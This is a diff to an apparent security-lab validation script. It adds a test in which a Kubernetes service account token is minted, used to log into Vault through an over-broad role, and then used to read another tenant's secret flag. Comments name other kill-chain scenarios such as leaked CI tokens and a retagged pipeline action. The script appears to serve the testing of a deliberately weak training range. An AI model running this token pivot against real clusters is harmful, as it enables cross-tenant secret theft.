@@ -457,6 +457,20 @@ EOF
   else no pbac_2 "no leaked token on runner"; fi
 fi
 
+echo "### Secrets & identity pivots ###"
+
+# --- sec_2: a pod SA token authenticates to Vault (over-broad role) -> reads beta's secret ----
+if enabled sec_2; then
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+JWT=$(k3s kubectl -n alpha create token alpha-ci)
+VT=$(curl -s http://vault:8200/v1/auth/kubernetes/login -d "{\"role\":\"overbroad\",\"jwt\":\"$JWT\"}" | sed -n 's/.*"client_token":"\([^"]*\)".*/\1/p')
+curl -s -H "X-Vault-Token: $VT" http://vault:8200/v1/secret/data/beta/crown | sed -n 's/.*"flag":"\([^"]*\)".*/\1/p'
+EOF
+)
+  chk sec_2 sec_2-vault-k8s-overbroad "$out"
+fi
+
 echo "### Supply-chain kill-chains ###"
 
 # --- sup_1: re-point the tag the pipeline trusts -> malicious action runs on next CI run ----
